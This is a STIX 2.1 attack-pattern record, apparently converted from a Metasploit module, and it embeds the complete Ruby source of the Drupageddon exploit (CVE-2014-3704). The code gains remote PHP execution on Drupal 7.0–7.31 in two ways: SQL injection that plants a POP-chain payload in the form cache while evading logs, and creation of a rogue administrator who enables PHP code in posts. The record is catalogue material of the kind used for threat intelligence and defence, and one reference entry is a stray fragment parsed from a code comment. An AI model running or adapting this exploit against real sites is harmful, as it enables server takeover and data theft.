{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--582a6b62-389a-452d-8af7-d7aea6901ece",
    "created": "2024-08-14T17:09:38.263189Z",
    "modified": "2024-08-14T17:09:38.263193Z",
    "name": "Drupal HTTP Parameter Key/Value SQL Injection",
    "description": " This module exploits the Drupal HTTP Parameter Key/Value SQL Injection (aka Drupageddon) in order to achieve a remote shell on the vulnerable instance. This module was tested against Drupal 7.0 and 7.31 (was fixed in 7.32).  Two methods are available to trigger the PHP payload on the target:  - set TARGET 0: Form-cache PHP injection method (default). This uses the SQLi to upload a malicious form to Drupal's cache then trigger the cache entry to execute the payload using a POP chain.  - set TARGET 1: User-post injection method. This creates a new Drupal user, adds it to the administrators group enable Drupal's PHP module, grant the administrators the right to bundle PHP code in their post, create a new post containing the payload and preview it to trigger the payload execution.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/drupal_drupageddon.rb",
            "external_id": "drupal_drupageddon.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-3704"
        },
        {
            "source_name": "reference",
            "url": "https://www.drupal.org/SA-CORE-2014-005"
        },
        {
            "source_name": "reference",
            "url": "http://www.sektioneins.de/en/advisories/advisory-012014-drupal-pre-auth-sql-injection-vulnerability.html"
        },
        {
            "source_name": "reference",
            "url": "https://www.whitewinterwolf.com/posts/2017/11/16/drupageddon-revisited-a-new-path-from-sql-injection-to-remote-command-execution-cve-2014-3704/"
        },
        {
            "source_name": "#!followsredirects",
            "external_id": "usedbysomeDrupalsitestoenforcecleanURLs."
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'Drupal HTTP Parameter Key/Value SQL Injection',\n      'Description'    => %q{\n        This module exploits the Drupal HTTP Parameter Key/Value SQL Injection\n        (aka Drupageddon) in order to achieve a remote shell on the vulnerable\n        instance. This module was tested against Drupal 7.0 and 7.31 (was fixed\n        in 7.32).\n\n        Two methods are available to trigger the PHP payload on the target:\n\n        - set TARGET 0:\n          Form-cache PHP injection method (default).\n          This uses the SQLi to upload a malicious form to Drupal's cache,\n          then trigger the cache entry to execute the payload using a POP chain.\n\n        - set TARGET 1:\n          User-post injection method.\n          This creates a new Drupal user, adds it to the administrators group,\n          enable Drupal's PHP module, grant the administrators the right to\n          bundle PHP code in their post, create a new post containing the\n          payload and preview it to trigger the payload execution.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'SektionEins',          # discovery\n          'WhiteWinterWolf',      # form-cache PHP injection method\n          'Christian Mehlmauer',  # user-post PHP injection method\n          'Brandon Perry'         # user-post PHP injection method\n        ],\n      'References'     =>\n        [\n          ['CVE', '2014-3704'],\n          ['URL', 'https://www.drupal.org/SA-CORE-2014-005'],\n          ['URL', 'http://www.sektioneins.de/en/advisories/advisory-012014-drupal-pre-auth-sql-injection-vulnerability.html'],\n          ['URL', 'https://www.whitewinterwolf.com/posts/2017/11/16/drupageddon-revisited-a-new-path-from-sql-injection-to-remote-command-execution-cve-2014-3704/']\n        ],\n      'Privileged'     => false,\n      'Platform'       => ['php'],\n      'Arch'           => ARCH_PHP,\n      'Targets'        =>\n        [\n          ['Drupal 7.0 - 7.31 (form-cache PHP injection method)', {}],\n          ['Drupal 7.0 - 7.31 (user-post PHP injection method)', {}]\n        ],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [],\n          'Reliability' => [],\n          'AKA' => ['Drupageddon']\n        },\n      'DisclosureDate' => '2014-10-15',\n      'DefaultTarget'  => 0\n    ))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [ true, \"The target URI of the Drupal installation\", '/'])\n      ])\n\n    register_advanced_options(\n      [\n        OptInt.new('Wait', [true, \"Number of seconds to wait before triggering the payload sent (form-cache method only).\", 5]),\n        OptString.new('ADMIN_ROLE', [ true, \"The administrator role (user-post method only)\", 'administrator']),\n        OptInt.new('Iter', [ true, \"Hash iterations (2^ITER, user-post method only))\", 10])\n      ])\n  end\n\n  ##\n  # Form-cache PHP injection method\n  ##\n\n  def sql_insert(id, value)\n    curlyopen = rand_text_alphanumeric(8)\n    curlyclose = rand_text_alphanumeric(8)\n    value.gsub!('{', curlyopen)\n    value.gsub!('}', curlyclose)\n\n    \"INSERT INTO {cache_form} (cid, data, expire, created, serialized) \" \\\n      + \"VALUES ('#{id}', REPLACE(REPLACE('#{value}', '#{curlyopen}', \" \\\n      + \"CHAR(#{'{'.ord})), '#{curlyclose}', CHAR(#{'}'.ord})), -1, 0, 1);\"\n  end\n\n  def exploit_formcache\n    form_build_id = 'form-' + rand_text_alphanumeric(43)\n\n    # Remove the malicious cache entries upon success.\n    evalstr = \"cache_clear_all(array('form_\" + form_build_id + \"', \" \\\n      + \"'form_state_\" + form_build_id + \"'), 'cache_form');\"\n    evalstr << payload.encoded\n    evalstr = Rex::Text.encode_base64(evalstr)\n    # '<?php' tag required by php_eval().\n    evalstr = \"<?php eval(base64_decode(\\\\'#{evalstr}\\\\'));\"\n    # Don't count the backslashes.\n    evalstr_len = evalstr.length - 2\n\n    # Serialized malicious form state.\n    # The PHP module may be disabled (and should be).\n    # Load its definition manually to get access to php_eval().\n    state = 'a:1:{s:10:\"build_info\";a:1:{s:5:\"files\";a:1:{'\n      state << 'i:0;s:22:\"modules/php/php.module\";'\n    state << '}}}'\n    # Initiates a POP chain in includes/form.inc:1850, form_builder()\n    form = 'a:6:{'\n      form << 's:5:\"#type\";s:4:\"form\";'\n      form << 's:8:\"#parents\";a:1:{i:0;s:4:\"user\";}'\n      form << 's:8:\"#process\";a:1:{i:0;s:13:\"drupal_render\";}'\n      form << 's:16:\"#defaults_loaded\";b:1;'\n      form << 's:12:\"#post_render\";a:1:{i:0;s:8:\"php_eval\";}'\n      form << 's:9:\"#children\";s:' + evalstr_len.to_s + ':\"' + evalstr + '\";'\n    form << '}'\n\n    # SQL injection key lines:\n    # - modules/user/user.module:2149, user_login_authenticate_validate()\n    # - includes/database/database.inc:745, expandArguments()\n    sql = sql_insert('form_state_' + form_build_id, state)\n    sql << sql_insert('form_' + form_build_id, form)\n    # Causes PHP script to timeout, avoiding payload logging.\n    sql << 'SELECT SLEEP(666);'\n\n    # Use the login form to inject the malicious cache entry.\n    # '!' follows redirects, used by some Drupal sites to enforce clean URLs.\n    # Don't check the return code as it *will* timeout.\n    send_request_cgi!({\n      'uri' => normalize_uri(target_uri.path),\n      'method' => 'POST',\n      'vars_post' => {\n        # Don't use 'user_login_block' as it may be disabled.\n        'form_id' => 'user_login',\n        'form_build_id' => '',\n        \"name[0;#{sql}#]\" => '',\n        # This field must be located *after* the injection.\n        \"name[0]\" => '',\n        'op' => 'Log in',\n        'pass' => Rex::Text.rand_text_alpha(8)\n      },\n      'vars_get' => {\n        'q' => 'user/login'\n      }\n    }, timeout=datastore['Wait'])\n\n    # Trigger the malicious cache entry using its form ID.\n    send_request_cgi!({\n      'uri' => normalize_uri(target_uri.path),\n      'method' => 'POST',\n      'vars_post' => {\n        'form_id' => 'user_login',\n        \"form_build_id\" => form_build_id,\n        \"name\" => Rex::Text.rand_text_alpha(10),\n        'op' => 'Log in',\n        'pass' => Rex::Text.rand_text_alpha(10)\n      },\n      'vars_get' => {\n        'q' => 'user/login'\n      }\n    })\n  end\n\n  ##\n  # User-post PHP injection method\n  ##\n\n  def uri_path\n    normalize_uri(target_uri.path)\n  end\n\n  def admin_role\n    datastore['ADMIN_ROLE']\n  end\n\n  def iter\n    datastore['Iter']\n  end\n\n  def itoa64\n    './0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'\n  end\n\n  # PHPs PHPASS base64 method\n  def phpass_encode64(input, count)\n    out = ''\n    cur = 0\n    while cur < count\n      value = input[cur].ord\n      cur += 1\n      out << itoa64[value & 0x3f]\n      if cur < count\n        value |= input[cur].ord << 8\n      end\n      out << itoa64[(value >> 6) & 0x3f]\n      break if cur >= count\n      cur += 1\n\n      if cur < count\n        value |= input[cur].ord << 16\n      end\n      out << itoa64[(value >> 12) & 0x3f]\n      break if cur >= count\n      cur += 1\n      out << itoa64[(value >> 18) & 0x3f]\n    end\n    out\n  end\n\n  def generate_password_hash(pass)\n    # Syntax for MD5:\n    # $P$ = MD5\n    # one char representing the hash iterations (min 7)\n    # 8 chars salt\n    # MD5_raw(salt.pass) + iterations\n    # MD5 phpass base64 encoded (!= encode_base64) and trimmed to 22 chars for md5\n    iter_char = itoa64[iter]\n    salt = Rex::Text.rand_text_alpha(8)\n    md5 = Rex::Text.md5_raw(\"#{salt}#{pass}\")\n    # convert iter from log2 to integer\n    iter_count = 2**iter\n    1.upto(iter_count) {\n      md5 = Rex::Text.md5_raw(\"#{md5}#{pass}\")\n    }\n    md5_base64 = phpass_encode64(md5, md5.length)\n    md5_stripped = md5_base64[0...22]\n    pass = \"$P\\\\$\" + iter_char + salt + md5_stripped\n    vprint_status(\"password hash: #{pass}\")\n\n    return pass\n  end\n\n  def sql_insert_user(user, pass)\n    \"insert into users (uid, name, pass, mail, status) select max(uid)+1, '#{user}', '#{generate_password_hash(pass)}', '#{Rex::Text.rand_text_alpha_lower(5)}@#{Rex::Text.rand_text_alpha_lower(5)}.#{Rex::Text.rand_text_alpha_lower(3)}', 1 from users\"\n  end\n\n  def sql_make_user_admin(user)\n    \"insert into users_roles (uid, rid) VALUES ((select uid from users where name='#{user}'), (select rid from role where name = '#{admin_role}'))\"\n  end\n\n  def extract_form_ids(content)\n    form_build_id = $1 if content =~ /name=\"form_build_id\" value=\"(.+?)\"/\n    form_token = $1 if content =~ /name=\"form_token\" value=\"(.+?)\"/\n\n    vprint_status(\"form_build_id: #{form_build_id}\")\n    vprint_status(\"form_token: #{form_token}\")\n\n    return form_build_id, form_token\n  end\n\n  def exploit_newuser\n\n    # TODO: Check if option admin_role exists via admin/people/permissions/roles\n\n    # call login page to extract tokens\n    print_status(\"Testing page\")\n    res = send_request_cgi({\n      'uri' => uri_path,\n      'vars_get' => {\n        'q' => 'user/login'\n      }\n    })\n\n    unless res and res.body\n      fail_with(Failure::Unknown, \"No response or response body, bailing.\")\n    end\n\n    form_build_id, form_token = extract_form_ids(res.body)\n\n    user = Rex::Text.rand_text_alpha(10)\n    pass = Rex::Text.rand_text_alpha(10)\n\n    post = {\n      \"name[0 ;#{sql_insert_user(user, pass)}; #{sql_make_user_admin(user)}; # ]\" => Rex::Text.rand_text_alpha(10),\n      'name[0]' => Rex::Text.rand_text_alpha(10),\n      'pass' => Rex::Text.rand_text_alpha(10),\n      'form_build_id' => form_build_id,\n      'form_id' => 'user_login',\n      'op' => 'Log in'\n    }\n\n    print_status(\"Creating new user #{user}:#{pass}\")\n    res = send_request_cgi({\n      'uri' => uri_path,\n      'method' => 'POST',\n      'vars_post' => post,\n      'vars_get' => {\n        'q' => 'user/login'\n      }\n    })\n\n    unless res and res.body\n      fail_with(Failure::Unknown, \"No response or response body, bailing.\")\n    end\n\n    # login\n    print_status(\"Logging in as #{user}:#{pass}\")\n    res = send_request_cgi({\n      'uri' => uri_path,\n      'method' => 'POST',\n      'vars_post' => {\n        'name' => user,\n        'pass' => pass,\n        'form_build_id' => form_build_id,\n        'form_id' => 'user_login',\n        'op' => 'Log in'\n      },\n      'vars_get' => {\n        'q' => 'user/login'\n      }\n    })\n\n    unless res and res.code == 302\n      fail_with(Failure::Unknown, \"No response or response body, bailing.\")\n    end\n\n    cookie = res.get_cookies\n    vprint_status(\"cookie: #{cookie}\")\n\n    # call admin interface to extract CSRF token and enabled modules\n    print_status(\"Trying to parse enabled modules\")\n    res = send_request_cgi({\n      'uri' => uri_path,\n      'vars_get' => {\n        'q' => 'admin/modules'\n      },\n      'cookie' => cookie\n    })\n\n    form_build_id, form_token = extract_form_ids(res.body)\n\n    enabled_module_regex = /name=\"(.+)\" value=\"1\" checked=\"checked\" class=\"form-checkbox\"/\n    enabled_matches = res.body.to_enum(:scan, enabled_module_regex).map { Regexp.last_match }\n\n    unless enabled_matches\n      fail_with(Failure::Unknown, \"No modules enabled is incorrect, bailing.\")\n    end\n\n    post = {\n      'modules[Core][php][enable]' => '1',\n      'form_build_id' => form_build_id,\n      'form_token' => form_token,\n      'form_id' => 'system_modules',\n      'op' => 'Save configuration'\n    }\n\n    enabled_matches.each do |match|\n      post[match.captures[0]] = '1'\n    end\n\n    # enable PHP filter\n    print_status(\"Enabling the PHP filter module\")\n    res = send_request_cgi({\n      'uri' => uri_path,\n      'method' => 'POST',\n      'vars_post' => post,\n      'vars_get' => {\n        'q' => 'admin/modules/list/confirm'\n      },\n      'cookie' => cookie\n    })\n\n    unless res and res.body\n      fail_with(Failure::Unknown, \"No response or response body, bailing.\")\n    end\n\n    # Response: http 302, Location: http://10.211.55.50/?q=admin/modules\n\n    print_status(\"Setting permissions for PHP filter module\")\n\n    # allow admin to use php_code\n    res = send_request_cgi({\n      'uri' => uri_path,\n      'vars_get' => {\n        'q' => 'admin/people/permissions'\n      },\n      'cookie' => cookie\n    })\n\n\n    unless res and res.body\n      fail_with(Failure::Unknown, \"No response or response body, bailing.\")\n    end\n\n    form_build_id, form_token = extract_form_ids(res.body)\n\n    perm_regex = /name=\"(.*)\" value=\"(.*)\" checked=\"checked\"/\n    enabled_perms = res.body.to_enum(:scan, perm_regex).map { Regexp.last_match }\n\n    unless enabled_perms\n      fail_with(Failure::Unknown, \"No enabled permissions were able to be parsed, bailing.\")\n    end\n\n    # get administrator role id\n    id = $1 if res.body =~ /for=\"edit-([0-9]+)-administer-content-types\">#{admin_role}:/\n    vprint_status(\"admin role id: #{id}\")\n\n    unless id\n      fail_with(Failure::Unknown, \"Could not parse out administrator ID\")\n    end\n\n    post = {\n      \"#{id}[use text format php_code]\" => 'use text format php_code',\n      'form_build_id' => form_build_id,\n      'form_token' => form_token,\n      'form_id' => 'user_admin_permissions',\n      'op' => 'Save permissions'\n    }\n\n    enabled_perms.each do |match|\n      post[match.captures[0]] = match.captures[1]\n    end\n\n    res = send_request_cgi({\n      'uri' => uri_path,\n      'method' => 'POST',\n      'vars_post' => post,\n      'vars_get' => {\n        'q' => 'admin/people/permissions'\n      },\n      'cookie' => cookie\n    })\n\n    unless res and res.body\n      fail_with(Failure::Unknown, \"No response or response body, bailing.\")\n    end\n\n    # Add new Content page (extract csrf token)\n    print_status(\"Getting tokens from create new article page\")\n    res = send_request_cgi({\n      'uri' => uri_path,\n      'vars_get' => {\n        'q' => 'node/add/article'\n      },\n      'cookie' => cookie\n    })\n\n    unless res and res.body\n      fail_with(Failure::Unknown, \"No response or response body, bailing.\")\n    end\n\n    form_build_id, form_token = extract_form_ids(res.body)\n\n    # Preview to trigger the payload\n    data = Rex::MIME::Message.new\n    data.add_part(Rex::Text.rand_text_alpha(10), nil, nil, 'form-data; name=\"title\"')\n    data.add_part(form_build_id, nil, nil, 'form-data; name=\"form_build_id\"')\n    data.add_part(form_token, nil, nil, 'form-data; name=\"form_token\"')\n    data.add_part('article_node_form', nil, nil, 'form-data; name=\"form_id\"')\n    data.add_part('php_code', nil, nil, 'form-data; name=\"body[und][0][format]\"')\n    data.add_part(\"<?php #{payload.encoded} ?>\", nil, nil, 'form-data; name=\"body[und][0][value]\"')\n    data.add_part('Preview', nil, nil, 'form-data; name=\"op\"')\n    data.add_part(user, nil, nil, 'form-data; name=\"name\"')\n    data.add_part('1', nil, nil, 'form-data; name=\"status\"')\n    data.add_part('1', nil, nil, 'form-data; name=\"promote\"')\n    post_data = data.to_s\n\n    print_status(\"Calling preview page. Exploit should trigger...\")\n    send_request_cgi(\n      'method'   => 'POST',\n      'uri'      => uri_path,\n      'ctype'    => \"multipart/form-data; boundary=#{data.bound}\",\n      'data'     => post_data,\n      'vars_get' => {\n        'q' => 'node/add/article'\n      },\n      'cookie' => cookie\n    )\n  end\n\n  ##\n  # Main\n  ##\n\n  def exploit\n    case datastore['TARGET']\n    when 0\n      exploit_formcache\n    when 1\n      exploit_newuser\n    else\n      fail_with(Failure::BadConfig, \"Invalid target selected.\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-10-15",
    "x_mitre_platforms": [
        "['php']"
    ]
}